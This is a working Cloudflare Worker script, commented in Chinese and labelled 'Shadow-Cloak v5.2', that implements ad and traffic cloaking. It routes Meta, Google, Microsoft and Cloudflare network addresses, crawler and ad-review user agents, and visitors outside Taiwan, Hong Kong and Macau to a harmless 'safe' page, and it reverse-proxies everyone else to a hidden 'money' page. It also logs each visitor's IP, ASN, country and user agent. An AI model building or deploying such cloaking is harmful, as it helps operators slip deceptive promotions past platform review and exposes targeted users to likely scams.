// ============================================
// 主路由 (ES Module 格式) v5.2
// ============================================
export default {
  async fetch(request, env, ctx) {
    const visitorId = crypto.randomUUID();
    const url = new URL(request.url);
    const cf = request.cf || {};
    
    // 判斷訪客身份
    const verdict = determineVerdict(cf, request);
    const reason = getVerdictReason(cf, request, verdict);
    
    // 選擇目標頁面
    const targetOrigin = verdict === 'safe' 
      ? 'https://safe-page.laoqin1689.workers.dev'
      : 'https://money-page.laoqin1689.workers.dev';
      
    // 準備日誌數據
    const logData = {
      visitor_id: visitorId,
      timestamp: new Date().toISOString(),
      ip: request.headers.get('CF-Connecting-IP') || 'unknown',
      asn: cf.asn || 0,
      country: cf.country || 'unknown',
      ua: request.headers.get('user-agent') || 'unknown',
      verdict,
      reason,
      path: url.pathname + url.search,
      referer: request.headers.get('referer') || ''
    };
    
    // 非同步記錄日誌（不阻塞回應）
    ctx.waitUntil(logToDB(env, logData));
    
    // Reverse Proxy：串流回傳目標頁面內容
    try {
      const proxyUrl = targetOrigin + url.pathname + url.search + (url.search ? '&' : '?') + 'vid=' + visitorId;
      const proxyRequest = new Request(proxyUrl, {
        method: request.method,
        headers: request.headers,
        body: request.body
      });
      const response = await fetch(proxyRequest);
      
      // 保留原始 Content-Type 和其他重要 headers
      const headers = new Headers(response.headers);
      headers.set('X-Shadow-Cloak', 'v5.2');
      headers.set('X-Verdict', verdict);
      
      return new Response(response.body, {
        status: response.status,
        statusText: response.statusText,
        headers
      });
    } catch (error) {
      console.error('Proxy error:', error);
      return new Response('Proxy error: ' + error.message, { status: 502 });
    }
  }
};

// ============================================
// 判斷訪客身份邏輯
// ============================================
function determineVerdict(cf, request) {
  const asn = cf.asn || 0;
  const country = cf.country || '';
  const ua = request.headers.get('user-agent') || '';
  
  // 黑名單 ASN（Meta、Google、Cloudflare、Microsoft）
  const blockedAsns = [32934, 15169, 13335, 8075];
  if (blockedAsns.includes(asn)) {
    return 'safe';
  }
  
  // 黑名單 UA（爬蟲）
  const botPatterns = [
    /facebookexternalhit/i,
    /googlebot/i,
    /bingbot/i,
    /bytespider/i,
    /yandexbot/i,
    /baiduspider/i,
    /slurp/i,
    /duckduckbot/i,
    /twitterbot/i,
    /linkedinbot/i,
    /whatsapp/i,
    /adsbot/i,
    /msnbot/i
  ];
  for (const pattern of botPatterns) {
    if (pattern.test(ua)) {
      return 'safe';
    }
  }
  
  // 國家白名單（只允許 TW/HK/MO）
  const allowedCountries = ['TW', 'HK', 'MO'];
  if (!allowedCountries.includes(country)) {
    return 'safe';
  }
  
  // 預設：推廣頁
  return 'money';
}

// ============================================
// 取得判決原因
// ============================================
function getVerdictReason(cf, request, verdict) {
  if (verdict === 'money') {
    return 'valid_traffic';
  }
  const asn = cf.asn || 0;
  const country = cf.country || '';
  const ua = request.headers.get('user-agent') || '';
  
  const blockedAsns = [32934, 15169, 13335, 8075];
  if (blockedAsns.includes(asn)) {
    return `blocked_asn_${asn}`;
  }
  
  const botPatterns = [
    { pattern: /facebookexternalhit/i, reason: 'facebook_bot' },
    { pattern: /googlebot/i, reason: 'google_bot' },
    { pattern: /bingbot/i, reason: 'bing_bot' },
    { pattern: /bytespider/i, reason: 'bytespider_bot' },
    { pattern: /yandexbot/i, reason: 'yandex_bot' },
    { pattern: /baiduspider/i, reason: 'baidu_bot' },
    { pattern: /slurp/i, reason: 'slurp_bot' },
    { pattern: /duckduckbot/i, reason: 'duckduck_bot' },
    { pattern: /twitterbot/i, reason: 'twitter_bot' },
    { pattern: /linkedinbot/i, reason: 'linkedin_bot' },
    { pattern: /whatsapp/i, reason: 'whatsapp_bot' },
    { pattern: /adsbot/i, reason: 'ads_bot' },
    { pattern: /msnbot/i, reason: 'msn_bot' }
  ];
  for (const item of botPatterns) {
    if (item.pattern.test(ua)) {
      return item.reason;
    }
  }
  
  const allowedCountries = ['TW', 'HK', 'MO'];
  if (!allowedCountries.includes(country)) {
    return `geo_filter_${country}`;
  }
  
  return 'unknown';
}

// ============================================
// D1 日誌寫入（使用 D1 Binding）
// ============================================
async function logToDB(env, logData) {
  try {
    if (!env.DB) {
      console.error('D1 Binding "DB" not found');
      return;
    }
    
    const stmt = env.DB.prepare(
      'INSERT INTO cloak_logs (timestamp, ip, asn, country, ua, verdict, reason, path, referer, visitor_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
    ).bind(
      logData.timestamp,
      logData.ip,
      logData.asn,
      logData.country,
      logData.ua,
      logData.verdict,
      logData.reason,
      logData.path,
      logData.referer,
      logData.visitor_id
    );
    
    const result = await stmt.run();
    if (result.success) {
      console.log(`[LOG] ${logData.verdict} | ${logData.ip} | ${logData.country} | ${logData.reason}`);
    } else {
      console.error('D1 write error:', result.error);
    }
  } catch (error) {
    console.error('Log error:', error);
  }
}
